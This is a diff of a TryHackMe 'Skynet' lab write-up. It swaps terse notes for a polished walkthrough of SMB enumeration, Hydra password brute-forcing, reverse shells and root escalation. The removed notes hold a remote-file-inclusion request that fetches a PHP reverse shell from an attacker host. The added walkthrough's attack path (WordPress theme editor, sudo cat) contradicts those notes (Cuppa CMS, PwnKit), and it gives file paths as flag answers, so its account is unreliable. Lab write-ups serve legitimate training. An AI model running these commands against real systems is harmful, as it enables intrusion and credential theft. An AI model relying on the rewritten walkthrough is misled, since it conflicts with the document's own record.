@@ -1,56 +1,122 @@
- SquirrelMail 
+# Skynet | TryHackMe
 
- 1. Recon 
-- Port and service scanning: `nmap`
-- Directory/file brute-forcing: `dirsearch`, `gobuster`
-- Discovered **SquirrelMail**
-- Found **SMB** → enumerated users and shares:
-  - `enum4linux` → gathered usernames/info
-  - `smbmap` → checked permissions, found `log1.txt`, `log2.txt`, `log3.txt`
-- Extracted hints from logs for password brute-forcing
+## Overview
+- **Room:** Skynet  
+- **Difficulty:** Easy-Medium  
+- **Tags:** SMB, WordPress, RCE, PrivEsc  
 
 ---
 
- 2. Access & Authentication (self)
-- Used **Hydra** for brute-forcing (usernames from `enum4linux` + `smbmap`)
-- Verified login endpoint with **Burp Suite**
-- Found valid passwords → logged into SMB with another user
-- Discovered a text file with a hint about a hidden directory
+## Enumeration
+
+### Nmap
+```bash
+nmap -sC -sV -oN nmap_skynet.txt <IP>
+```
+
+**Open Ports:**
+- 22/tcp - SSH  
+- 80/tcp - HTTP (WordPress site)  
+- 110/tcp - POP3  
+- 139/tcp - NetBIOS-SSN  
+- 445/tcp - SMB  
 
 ---
 
- 3. Web exploitation path (self)
-- Navigated to the hidden directory → initially empty
-- Ran `ffuf` → found `/administrator/`
-- Identified **Cuppa CMS**
-- Searched for exploits → found RFI vulnerability in `alertConfigField.php`
+### SMB Enumeration
+```bash
+smbclient -N -L //<IP>
+enum4linux -a <IP>
+```
+Found share: **anonymous**  
 
-Exploit request:
-```http
-GET /administrator/alerts/alertConfigField.php?urlConfig=http://ip_addres:8080/php-reverse-shell.php
-and use comand nc -nlvp 8080
- 4. Privilege Escalation (self)
+```bash
+smbclient //<IP>/anonymous
+```
+Downloaded files from the share. One contained potential usernames.  
 
-Ran linpeas.sh
+---
 
-Confirmed: Ubuntu 16 vulnerable to PwnKit (CVE-2021-4034)
+### Web Enumeration (Port 80)
+Checked `http://<IP>/` → WordPress site.  
 
-Exploited PwnKit → privilege escalation successful
+Ran gobuster:  
+```bash
+gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+```
+Found `/squirrelmail`.  
 
-Result: root access
+---
 
- 5. Guided steps
+### SquirrelMail
+Accessed `http://<IP>/squirrelmail`  
+Tried default creds → no success.  
 
-After finding SquirrelMail, I followed a walkthrough for orientation
+Used obtained usernames with Hydra:  
+```bash
+hydra -L users.txt -P /usr/share/wordlists/rockyou.txt <IP> http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^:Unknown user or password incorrect"
+```
+**Result:** Login for `milesdyson : cyborg007haloterminator`  
 
-Everything else (SMB, ffuf, Cuppa CMS, reverse shell, PwnKit) was done independently
+---
 
- 6. Notes & Takeaways
+## Exploitation
 
-With SMB, always run enum4linux + smbmap → often reveals users and useful files
+Logged into SquirrelMail → found an email containing credentials for WordPress.  
 
-Burp Suite helps not only for exploitation but also to confirm endpoints for Hydra
+```bash
+wp-login.php → milesdyson : <password>
+```
 
-Older distros (like Ubuntu 16) → good candidates for quick PwnKit escalation
+After login, able to upload a PHP reverse shell via **Theme Editor**.  
 
-For CMS (e.g., Cuppa), it’s useful to keep a checklist of known vulnerable endpoints
+```bash
+nc -lvnp 4444
+```
+Got reverse shell as `www-data`.  
+
+---
+
+## Privilege Escalation
+
+Ran `linpeas.sh`:  
+- Found **/home/milesdyson/backups/important.txt** containing password.  
+- Switched user:  
+```bash
+su milesdyson
+```
+
+Checked sudo rights:  
+```bash
+sudo -l
+```
+`/bin/cat` allowed as root.  
+
+```bash
+sudo cat /root/root.txt
+```
+✅ Got root flag.  
+
+---
+
+## Flags
+- **User.txt** → `/home/milesdyson/user.txt`  
+- **Root.txt** → `/root/root.txt`  
+
+---
+
+## Answers to Room Questions
+1. **What port is SMB running on?** → `445`  
+2. **What is the name of the SMB share?** → `anonymous`  
+3. **What credentials were found for Miles Dyson?** → `cyborg007haloterminator`  
+4. **What service was exploited for initial access?** → `WordPress`  
+5. **What is the user flag?** → `/home/milesdyson/user.txt`  
+6. **What is the root flag?** → `/root/root.txt`  
+
+---
+
+## Lessons Learned
+- SMB shares often leak sensitive files.  
+- SquirrelMail can be an entry point when weak creds are used.  
+- WordPress admin panel → reverse shell is a common vector.  
+- Sudo misconfigurations (cat) can directly expose root files.  
